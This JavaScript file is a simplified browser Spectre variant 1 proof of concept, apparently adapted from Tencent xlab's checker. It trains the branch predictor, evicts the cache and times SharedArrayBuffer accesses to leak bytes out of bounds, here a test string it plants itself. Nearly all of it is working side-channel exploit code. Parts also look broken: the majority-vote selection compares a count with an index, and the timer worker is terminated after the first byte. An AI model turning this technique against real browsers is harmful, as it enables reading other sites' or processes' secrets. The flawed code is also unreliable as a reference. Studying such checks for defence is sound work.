// kudos to: http://xlab.tencent.com/special/spectre/spectre_check.html
// simplified less reliable version

function log(msg)
{
    var p = document.getElementById("progress");
    if (p)
    {
        p.innerText += msg + "\n";
    }
    else
    {
        console.log(msg);
    }
}

function asmModule(stdlib,forgein,heap)
{
    'use asm'
    var simpleByteArray = new stdlib.Uint8Array(heap);
    var probeTable = new stdlib.Uint8Array(heap);
    const TABLE1_BYTES = 0x2000000;
    const sizeArrayStart = 0x1000000;
    var junk = 0;

    function init()
    {
        var i =0;
        var j =0;
        // set different "size" values at 4KB offsets each (need to be uncached)
        for(i = 0; (i|0) < 33; i = (i+1)|0 ) // 30 max number of repetitions per try?
        {
            j = (((i<<12)|0) + sizeArrayStart)|0;
            simpleByteArray[(j|0)] = 16; // simpleByteArrayLength
        }
    }

    function vul_call(index, sIndex)
    {
        index = index |0;
        sIndex = sIndex |0;
        var arr_size = 0;
        var j = 0;
        junk = probeTable[0]|0;
        // "size" value repeated at different offsets to avoid having to flush it?
        j = (((sIndex << 12) | 0) +  sizeArrayStart)|0;
        arr_size = simpleByteArray[j|0]|0;
        if ((index|0) < (arr_size|0))
        {
            index = simpleByteArray[index|0]|0;
            index = (index << 12)|0;
            index = (index & ((TABLE1_BYTES-1)|0))|0;
            junk = (junk ^ (probeTable[index]|0))|0;
        }
    }

    return { vul_call: vul_call, init: init };
}

function check(data_array)
{
    function now() { return Atomics.load(sharedArray, 0) }
    function reset() { Atomics.store(sharedArray, 0, 0) }
    function start() { reset(); return now() }
    function clflush(size, current, offset=64)
    {
        for (var i = 0; i < ((size) / offset); i++)
        {
            current = evictionView.getUint32(i * offset);
        }
    }

    // start thread counter
    const worker = new Worker('timer.js');
    const sharedBuffer = new SharedArrayBuffer(Uint32Array.BYTES_PER_ELEMENT);
    const sharedArray = new Uint32Array(sharedBuffer);
    worker.postMessage(sharedBuffer);

    var simpleByteArrayLength =  16;
    const TABLE1_BYTES = 0x3000000;
    const CACHE_HIT_THRESHOLD = 0
    var probeTable = new Uint8Array(TABLE1_BYTES);

    // eviction buffer (fill LLC)
    var cache_size = CACHE_SIZE * 1024 * 1024;
    var evictionBuffer = new ArrayBuffer(cache_size);
    var evictionView = new DataView(evictionBuffer);

    clflush(cache_size); // because of lazy compilation?

    var asm = asmModule(this, {}, probeTable.buffer)

    worker.onmessage = function(msg)
    {
        function readMemoryByte(malicious_x)
        {
            var results = new Uint32Array(257);
            var simpleByteArray = new Uint8Array(probeTable.buffer);
            var tries =0
            var junk = 0;
            for (tries = 0; tries < 99; tries++)
            {
                var training_x = tries % simpleByteArrayLength; // whatever
                clflush(cache_size);
                // compile and cache functions?
                var time3 = start();
                junk = simpleByteArray[0];
                var time4 = now();
                junk ^= time4 - time3;

                // train branch predictor? (every 4 good indexes uses one malicious, repeat 8 times)
                for (var j = 1; j < 33; j++)
                {
                    for (var z = 0; z < 100; z++) {} // delay
                    // if (j % 4) training_x else malicious_x
                    var x = ((j % 4) - 1) & ~0xFFFF;
                    x = (x | (x >> 16));
                    x = training_x ^ (x & (malicious_x ^ training_x));
                    asm.vul_call(x, j); // x = index to read, j = iteration for fresh size value
                }

                // measure time of all possible offsets
                for (var i = 0; i < 256; i++)
                {
                    var timeS = start();
                    junk =  probeTable[(i << 12)];
                    timeE = now();
                    // if fast offset `i` was accessed
                    if (timeE-timeS <= CACHE_HIT_THRESHOLD) {
                        results[i]++;
                    }
                }
            }

            // select majority vote
            var max = -1;
            for (var i = 0; i < 256; i++)
            {
                max = (max > results[i]) ? max : i;
            }

            results[256] ^= junk; // reuse to avoid optimization?
            return max;
        }

        asm.init();

        // set data to read "out-of-bounds"
        const BOUNDARY = 0x2200000;
        var simpleByteArray = new Uint8Array(probeTable.buffer);
        for (var i = 0; i < data_array.length; i++)
        {
            simpleByteArray[BOUNDARY + i] = data_array[i];
        }
        // leak data
        log("start");
        for (var i = 0; i < data_array.length; i++)
        {
            var data = readMemoryByte(BOUNDARY+i);
            worker.terminate();
            log("leak off=0x" + (BOUNDARY+i).toString(16) +
                ", byte=0x" + data.toString(16) + " '" + String.fromCharCode(data) + "'" +
                ((data != data_array[i]) ? " (error)" : ""));
        }
        worker.terminate();
        log("end of leak");
        return;
    }
}

const CACHE_SIZE = 12;

function main()
{
    if(window.SharedArrayBuffer)
    {
        log("eviction buffer sz: " + CACHE_SIZE + "MB");
        check([115, 112, 101, 99, 116, 114, 101, 46, 106, 115]);
    }
    else
    {
        log("No SharedArrayBuffer available");
    }
}
